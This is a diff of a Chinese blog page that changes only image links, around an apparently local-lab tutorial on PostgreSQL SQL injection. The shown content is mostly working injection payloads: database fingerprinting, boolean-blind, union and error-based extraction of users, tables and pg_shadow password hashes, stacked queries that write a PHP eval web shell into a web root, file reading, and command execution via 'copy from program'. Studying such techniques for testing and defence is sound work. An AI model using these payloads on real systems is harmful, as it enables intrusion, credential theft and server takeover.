@@ -220,13 +220,13 @@
         <div class="post-content">
             <h3 id="判断是否为postgresql数据库"><a href="#判断是否为postgresql数据库" class="headerlink" title="判断是否为postgresql数据库"></a>判断是否为postgresql数据库</h3><figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>+<span class="number">1</span>::<span class="type">int</span>=<span class="number">1</span><span class="comment">-- postgresql的专用语法，回显正常即说明是postgresql</span></span><br><span class="line"><span class="keyword">and</span>+<span class="number">1</span>=length(<span class="number">1</span>)<span class="comment">-- postgresql的length函数只能是字符串，不能是数字类型</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809144723772.png" alt="image-20250809144723772"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/1.png" alt="1"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=length(&#x27;a&#x27;),正常</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809144830609.png" alt="image-20250809144830609"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/2.png" alt="2"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=length(1),报错</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809144901699.png" alt="image-20250809144901699"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/3.png" alt="3"></p>
 <h3 id="常用查询函数"><a href="#常用查询函数" class="headerlink" title="常用查询函数"></a>常用查询函数</h3><figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询当前用户: </span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>; </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>; </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>; </span><br><span class="line"><span class="keyword">SELECT</span> getpgusername(); </span><br><span class="line"><span class="keyword">SELECT</span> usename <span class="keyword">FROM</span> pg_user;</span><br><span class="line">查询数据库：</span><br><span class="line"><span class="keyword">SELECT</span> current_database(); </span><br><span class="line">查询版本：</span><br><span class="line"><span class="keyword">SELECT</span> version();</span><br><span class="line">查询数据库用户名和密码hash值</span><br><span class="line"><span class="keyword">SELECT</span> usename, passwd <span class="keyword">FROM</span> pg_shadow;</span><br></pre></td></tr></table></figure>
 
 <h3 id="常见注入类型"><a href="#常见注入类型" class="headerlink" title="常见注入类型"></a>常见注入类型</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>注意：postgresql中没有if函数，涉及到判断需要用CASE WHEN 1&#x3D;1 THEN 1 ELSE 0 END。</strong></p>
@@ -234,11 +234,11 @@
 <p>不常用函数解释：</p>
 <figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpad() <span class="comment">-- rpad() 函数的作用是在字符串右侧填充指定的字符，直到字符串达到指定的长度。</span></span><br><span class="line">lpad() <span class="comment">-- lpad() 函数的作用是在字符串左侧填充指定的字符，直到字符串达到指定的长度。</span></span><br><span class="line">例如：</span><br><span class="line">rpad(<span class="keyword">user</span>,<span class="number">10</span>,<span class="string">&#x27;*&#x27;</span>),因为<span class="keyword">user</span>长度不够<span class="number">10</span>，所以在右侧填充了两个*号，使字符串长度达到<span class="number">10.</span></span><br><span class="line">lpad(<span class="keyword">user</span>,<span class="number">10</span>,<span class="string">&#x27;*&#x27;</span>)，也就是会在左侧填充两个<span class="string">&#x27;*&#x27;</span>号</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809160623946.png" alt="image-20250809160623946"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809160925813.png" alt="image-20250809160925813"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/4.png" alt="4"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/5.png" alt="5"></p>
 <p>当不加第三个参数的时候，也就是不需要填充任何字符，这时候就会直接输出原user的字符。所以可利用该函数注入得到数据。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809161033877.png" alt="image-20250809161033877"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809161052401.png" alt="image-20250809161052401"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/6.png" alt="6"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/7.png" alt="7"></p>
 <p>注入语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">也可以使用ascii()和substring()的方式</span><br><span class="line">1&#x27;+and+&#x27;p&#x27;=substr(left(user,8),1,1)--</span><br><span class="line">1&#x27;+and+&#x27;p&#x27;=substr(right(user,8),1,1)--</span><br><span class="line">1&#x27;+and+&#x27;p&#x27;=substr(lpad(user,8),1,1)--</span><br><span class="line">1&#x27;+and+&#x27;p&#x27;=substr(rpad(user,8),1,1)--</span><br></pre></td></tr></table></figure>
 
@@ -247,7 +247,7 @@
 <p>举例：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">position(&#x27;o&#x27; in &#x27;root&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809163647634.png" alt="image-20250809163647634"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/8.png" alt="8"></p>
 <p>返回2的原因是字符o在root字符串第一个出现的位置是2。</p>
 <p>注入语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1=(CASE WHEN position(&#x27;A&#x27; in user)=1 THEN 1 ELSE 0 END) --遍历参数A即可得到user的第一个字符</span><br><span class="line">1=(CASE WHEN position(&#x27;AB&#x27; in user)=1 THEN 1 ELSE 0 END) --遍历参数B即可得到user的第二个字符</span><br><span class="line">以此类推，即可得到user的值。</span><br><span class="line">进阶用法：可以搭配exp()来使用，利用exp(709)正常，exp(710)报错的特征来注入。</span><br><span class="line">-1&#x27;or+1=exp(710-(position(&#x27;p&#x27;+in+user)))-- --此条语句有可能会有多条返回正常的页面，因为position是返回的字符出现的第一个位置，有可能是1，也有可能是2，是3，所以710-1，或者710-2都是正常的。这时候如果user的值没有重复的话，这些返回正常页面的字符就是user的值，只不过目前顺序是乱的，我们只需要去判断一下出现的位置就好了。</span><br></pre></td></tr></table></figure>
@@ -257,19 +257,19 @@
 
 <h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>先通过order by 判断列数。</p>
 <p>order by 3，正常。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809174804653.png" alt="image-20250809174804653"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/9.png" alt="9"></p>
 <p>order by 4报错。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809174832438.png" alt="image-20250809174832438"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/10.png" alt="10"></p>
 <p>即可确定为3列。</p>
 <p>在order by确认字段数量后，需要用null来填充字段，然后依次去判断每个字段的字符类型（字符类型用’null’,整数型用直接用整数代替），若直接使用整数型1,2,3来填充则会报错。</p>
 <p>注意：联合注入时需要前面的id值或者别的参数一定为false才可以回显数据。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809174924101.png" alt="image-20250809174924101"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/11.png" alt="11"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,&#x27;null&#x27;,&#x27;null&#x27;-- 判断出第2和第3个参数可以回显。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809175104613.png" alt="image-20250809175104613"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/12.png" alt="12"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,user,&#x27;null&#x27;-- 直接获取user</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809175224682.png" alt="image-20250809175224682"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/13.png" alt="13"></p>
 <p>在postgresql中没有group_concat函数，如果需要将大量数据一起查出来的话可以用string_agg和array_agg两个函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select string_agg(id||&#x27;,&#x27;||username||&#x27;,&#x27;||password, &#x27;,&#x27;) from users</span><br><span class="line">select array_to_string(array_agg(id||&#x27;,&#x27;||username||&#x27;,&#x27;||password), &#x27;,&#x27;) from users</span><br><span class="line">select * from users limit 1 offset 1 --limit 1 offset 0 是查第一条记录，limit 1 offset 1 是查第二条记录。</span><br></pre></td></tr></table></figure>
 
@@ -280,42 +280,44 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,relname,&#x27;null&#x27;+from+pg_stat_user_tables+where+schemaname=&#x27;public&#x27;+limit+1+offset+1-- limit 1 offset 0 </span><br><span class="line">-1&#x27;union select 1,tablename,&#x27;null&#x27; from pg_tables where schemaname=&#x27;public&#x27;--</span><br><span class="line">-1&#x27; union select 1,table_name,&#x27;null&#x27; from information_schema.tables where table_schema=&#x27;public&#x27; limit 1 offset 1--</span><br></pre></td></tr></table></figure>
 
 <p>第一个表：</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809182523143.png" alt="image-20250809182523143"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/14.png" alt="14"></p>
 <p>第二个表：</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809182539252.png" alt="image-20250809182539252"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/15.png" alt="15"></p>
 <p>第三个表：（没有了）</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809182555641.png" alt="image-20250809182555641"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/16.png" alt="16"></p>
 <p>一次性读取：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,string_agg(tablename||&#x27;~&#x27;,&#x27;&#x27;) ,&#x27;null&#x27; from pg_tables where schemaname=&#x27;public&#x27;--</span><br><span class="line">-1&#x27;union select 1,array_to_string(array_agg(tablename || &#x27;~&#x27;), &#x27;&#x27;) ,&#x27;null&#x27; FROM pg_tables  WHERE schemaname = &#x27;public&#x27;--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809201034703.png" alt="image-20250809201034703"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809201305864.png" alt="image-20250809201305864"></p>
+<p>string_agg()</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/17.png" alt="17"></p>
+<p>array_to_string(array_agg())</p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/18.png" alt="18"></p>
 <p>读取列名：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,column_name,&#x27;null&#x27;+from+information_schema.columns+where+table_name+=+&#x27;sqli_data&#x27;+limit+1+offset+0-- 第一个列名</span><br><span class="line">-1&#x27;union+select+1,column_name,&#x27;null&#x27;+from+information_schema.columns+where+table_name+=+&#x27;sqli_data&#x27;+limit+1+offset+1-- 第二个列名</span><br><span class="line">-1&#x27;union+select+1,column_name,&#x27;null&#x27;+from+information_schema.columns+where+table_name+=+&#x27;sqli_data&#x27;+limit+1+offset+2-- 第三个列名</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809180627150.png" alt="image-20250809180627150"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809180714138.png" alt="image-20250809180714138"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809180739321.png" alt="image-20250809180739321"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/19.png" alt="19"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/20.png" alt="20"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/21.png" alt="21"></p>
 <p>读取内容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,content,&#x27;null&#x27;+from+sqli_data+limit+1+offset+0-- 0就是第一条，1就是第二条。</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809181028065.png" alt="image-20250809181028065"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/22.png" alt="22"></p>
 <p>通过联合注入读取postgresql的账号密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union+select+1,usename,passwd+from+pg_shadow+limit+1+offset+0--</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809181256999.png" alt="image-20250809181256999"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/23.png" alt="23"></p>
 <p>这里没有解开，如果用的是弱口令大概率也是可以解开的。但是此处需要注意，查出来的md5值不只是密码的，而是密码加用户名组合的md5值。</p>
 <p>我这里本地用的密码sqladmin,那查出来的md5值应该就是密码加用户名也就是sqladminpostgres的md5。</p>
 <p>没错了，就是这样。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809181610768.png" alt="image-20250809181610768"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809181328053.png" alt="image-20250809181328053"></p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809183546541.png"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/24.png" alt="24"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/25.png" alt="25"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/26.png" alt="26"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=cast(version() as int)-- CAST用于将一个值转换为指定的数据类型。CAST(version() aS int) 尝试将 version() 返回的字符串转换为整数类型，无法转换所以报错。</span><br><span class="line">and 1=cast(user||123 as int)-- postgresql用户相当于root权限</span><br><span class="line">and 1=cast(current_database()::text as int)--</span><br><span class="line">and+1=cast((select+relname+from+pg_stat_user_tables+limit+1+offset+0)::text+as+int)--</span><br><span class="line">and+1=cast(user+as+integer)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809182834471.png" alt="image-20250809182834471"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809182855180.png" alt="image-20250809182855180"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/27.png" alt="27"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/28.png" alt="28"></p>
 <h4 id="堆叠注入-可getshell"><a href="#堆叠注入-可getshell" class="headerlink" title="堆叠注入(可getshell)"></a>堆叠注入(可getshell)</h4><p>可以用;隔开，单独执行sql语句。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809190308804.png" alt="image-20250809190308804"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/29.png" alt="29"></p>
 <h5 id="写入文件getshell：（需要已知绝对路径和可写权限）"><a href="#写入文件getshell：（需要已知绝对路径和可写权限）" class="headerlink" title="写入文件getshell：（需要已知绝对路径和可写权限）"></a>写入文件getshell：（需要已知绝对路径和可写权限）</h5><p><strong>用户得是超级用户或者pg_read_server_files组中用户</strong></p>
 <p>判断是否是超级用户或者pg_read_server_files组中用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;t&#x27;=( select usesuper FROM pg_user WHERE usename = current_user)--回显正常是，报错则不是</span><br><span class="line">1&#x27; and &#x27;t&#x27;=(SELECT pg_has_role(&#x27;pg_read_server_files&#x27;, &#x27;USAGE&#x27;) AS is_member)--回显正常是，报错则不是</span><br></pre></td></tr></table></figure>
@@ -326,19 +328,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;copy (select &#x27;$$&lt;?php @eval($_POST[cracer]);?&gt;$$&#x27;) to &#x27;C:\\phpstudy_pro\\WWW\\pgsql\\1.php&#x27;;--</span><br></pre></td></tr></table></figure>
 
 <p>一开始没有1.php文件。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809190800700.png" alt="image-20250809190800700"></p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809190834659.png" alt="image-20250809190834659"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/30.png" alt="30"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/31.png" alt="31"></p>
 <p>执行完查看：成功写入。</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809190902514.png" alt="image-20250809190902514"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/32.png" alt="32"></p>
 <p>第二种：建表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;create table abc(abc text not null);</span><br><span class="line">;insert into abc values($$&lt;?php @eval($_POST[cc]);?&gt;$$);</span><br><span class="line">;copy abc(abc) to &#x27;C:\\phpstudy_pro\\WWW\\pgsql\\2.php&#x27;;</span><br><span class="line">drop table abc;</span><br></pre></td></tr></table></figure>
 
 <p>执行完成功写入2.php</p>
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809191353567.png" alt="image-20250809191353567"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/33.png" alt="33"></p>
 <h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p><strong>用户得是超级用户或者pg_read_server_files组中用户</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;create table abcd(file text not null);</span><br><span class="line">;copy abcd(file) from &#x27;C:\\phpstudy_pro\\WWW\\pgsql\\1.php&#x27;;</span><br><span class="line">;select * from abcd;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://n55iwi.oss-cn-beijing.aliyuncs.com/image-20250809192630090.png" alt="image-20250809192630090"></p>
+<p><img src="https://n55iwi-del.oss-cn-guangzhou.aliyuncs.com/34.png" alt="34"></p>
 <h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p><strong>用户得是超级用户或者pg_read_server_files组中用户</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists cmd_exec;</span><br><span class="line">create table cmd_exec(cmd_output text);</span><br><span class="line">copy cmd_exec from program &#x27;whomai&#x27;;</span><br><span class="line">select cmd_output from cmd_exec;</span><br><span class="line">drop table if exists cmd_exec;</span><br></pre></td></tr></table></figure>
 
